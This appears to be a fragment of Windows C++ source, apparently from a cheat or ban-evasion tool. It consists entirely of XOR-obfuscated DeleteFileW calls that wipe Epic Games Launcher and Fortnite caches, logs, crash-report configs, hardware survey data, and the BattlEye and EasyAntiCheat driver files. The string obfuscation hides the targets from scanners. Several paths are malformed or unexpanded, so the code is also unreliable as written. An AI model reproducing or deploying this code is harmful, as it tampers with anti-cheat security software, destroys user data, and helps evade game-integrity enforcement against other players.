	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00004e"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00004f"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000050"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000051"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000052"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000053"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\EditorPerProjectUserSettings.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Engine.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Game.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Hardware.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Input.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Lightmass.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\PortalRegions.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\65f6b08d488442e694b1e23d152d971e.dat"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\b371f0ee15b74eba84bd23830461130c.dat"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\OC_65f6b08d488442e694b1e23d152d971e.dat"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\OC_b371f0ee15b74eba84bd23830461130c.dat"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\cef3.log"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\EpicGamesLauncher.log"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\EpicGamesLauncher_2.log"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\data_0"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\data_1"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\data_2"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\data_3"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000001"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000002"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000004"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000005"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000006"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000007"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000008"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000009"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000a"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000b"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000c"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000d"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000e"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000f"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000010"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000011"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000012"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000013"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000014"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000015"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000016"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000017"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000018"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000019"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001a"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001b"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001c"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001d"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001e"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001f"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000020"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000021"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000022"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000023"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000024"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000025"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000026"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000027"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000028"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002b"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002c"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002d"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002e"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002f"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000030"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000031"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000032"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000033"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000034"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000035"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000036"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000037"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000038"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000039"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003a"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003b"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003c"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003d"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003e"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00003f"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000040"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000041"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000042"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000043"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000044"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000045"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000046"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\CacheAccess.json"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\09_SubgameSelect_Default_StW-512x1024-e47f51e25cbe9943678b9221056a808e81da40e3.jpg"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_BattleLabs_PlaylistTile-(2)-1024x512-ca5f4e84a2941264f787239caa5458d0eabd39e3.jpg"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_In-Game_Launch_Week1_SubgameSelect-512x1024-8b298ddfb13ca218af3f10017e4e989888212e9e.jpg"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_Launch_ModeTiles_Duos-1024x512-b73da22f5ef25695bd78814e0c708253a2cfd66b.jpg"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_Launch_ModeTiles_Solo-1024x512-867508f824d65b998c1e11180306eeb720b1aa11.jpg"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_Launch_ModeTiles_Squad-1024x512-4bca2b25311bd5b8c6bd4a4aa32b2bfa2fadbf78.jpg"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_LTM_Siphon_PlaylistTile-1024x512-712b3caea93ea8df09d1592c88d55913ad296526.jpg"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_LunarNewYear_GanPickaxe_MOTD_1920x1080-1920x1080-7c458359ec91e63c981ae8bae9498a590446c32b.jpg"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\BR06_ModeTile_TDM-1024x512-878ba9f92deb153ec85f2bcbce925e185344290e.jpg"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\C2CM_Launch_In-Game_Subgame_PropHunt-512x1024-c84b714dc3c2f4ec9dc966074c0c53deef2dc9.jpg"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\CM_LobbyTileArt-1024x512-fb48db36552ccb1ab4021b722ea29d515377cc.jpg"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\Fortnite%2Ffortnite-game%2Fbattleroyalenews%2F1140+HF%2F8ball_MOTD_1024x512-1024x512-b8690a2ee91e5ccfc2c9ab23561be0dda6ee55.jpg"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\Fortnite%2Ffortnite-game%2Ftournaments%2F11BR_Arena_ModeTiles_Duos-1024x512-a431d8587eb87ad5630eada21b60bca9874d116a.jpg"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\Fortnite%2Ffortnite-game%2Ftournaments%2F11BR_Arena_ModeTiles_Solo_ModeTile-1024x512-6cee09d7bcf82ce3f32ca7c77ca04948121ce617.jpg"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\DMS"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\c7dee411e20a44ab930f841e8d206b1b"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\b6c60402a72e4081a6a47c641371c19f"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\a22d837b6a2b46349421259c0a5411bf"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\3460cbe1c57d4a838ace32951a4d7171"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\7e2a66ce68554814b1bd0aa14351cd71"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\c52c1f9246eb48ce9dade87be5a66f29"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\b800b911053c4906a5bd399f46ae0055"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Cloud\\47343f26116f49d1a460ad740dc2bbbb\\ClientSettings.Sav"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Input.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Lightmass.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\PortalRegions.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\CrashReportClient\\UE4CC-Windows-3F785CCB48B0E4F697FA2DA1403F027A\\CrashReportClient.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\CrashReportClient\\UE4CC-Windows-D36903E04AEBB495D1D6A58F05AC6671\\CrashReportClient.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\CrashReportClient\\UE4CC-Windows-F219A7F84FE8B0694E2FACB917EF2D34\\CrashReportClient.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\47d12477ed4c40cab8623c53ea967927.dat"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\EpicGamesLauncher-backup-2020.01.28-07.02.36.log"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\EpicGamesLauncher-backup-2020.01.28-09.00.40.log"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\EpicGamesLauncher-backup-2020.01.28-09.00.50.log"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\EpicGamesLauncher_2.log"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\SelfUpdatePrereqInstall.log"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\SelfUpdatePrereqInstall_0_PortalPrereqSetup.log"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\LOG.old"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Local Storage\\https_www.epicgames.com_0.localstorage-journal"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\6dfe4cbf-2643-41f6-977a-7f1e6f36a2f2\\index-dir\\the-real-index"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\LOG.old"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\2cc80dabc69f58b6_0"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\2cc80dabc69f58b6_1"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\HardwareSurvey\\dxdiag.txt"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\Compat.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\EditorPerProjectUserSettings.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\Engine.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\Game.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\GameUserSettings.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\Hardware.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\Input.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\Lightmass.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\MessagingDebugger.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\PortalRegions.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\Scalability.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\UdpMessaging.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\XCodeSourceCodeAccess.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files (x86)\\Common Files\\BattlEye"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files (x86)\\Common Files\\BattlEye\\BEDaisy.sys"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files (x86)\\CommonFiles\\BattlEye\\BEDaisy.sys\\"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files (x86)\\EasyAntiCheat"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files (x86)\\EasyAntiCheat\\EasyAntiCheat.sys"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files (x86)\\Epic Games\\Launcher\\Engine\\Programs\\CrashReportClient\\Config\\DefaultEngine.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files (x86)\\Epic Games\\Launcher\\VaultCache"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files (x86)\\EpicGames\\Launcher\\Portal\\Binaries\\Win32"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files (x86)\\EpicGames\\Launcher\\Portal\\Binaries\\Win32\\"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Base.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\BaseGame.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\BaseInput.ini"));
